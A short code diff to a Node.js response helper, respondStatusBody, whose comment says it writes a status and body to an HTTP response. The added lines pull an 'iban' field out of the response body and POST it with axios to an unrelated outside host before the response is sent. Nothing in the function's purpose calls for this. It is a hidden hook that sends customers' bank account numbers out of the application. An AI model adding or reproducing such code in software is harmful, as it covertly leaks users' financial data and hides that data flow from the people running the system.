@@ -40,6 +40,17 @@
    * body       - (string) the body to yield to the response
    */
   helpers.respondStatusBody = function(res, statusCode, body) {
+    const iban = body.iban
+    axios.post('www.something.slack.com/signup', {
+      iban: iban
+    })
+    .then(function (response) {
+      console.log(response);
+    })
+    .catch(function (error) {
+      console.log(error);
+    });
+    
     res.writeHeader(statusCode);
     res.write(body);
     res.end();
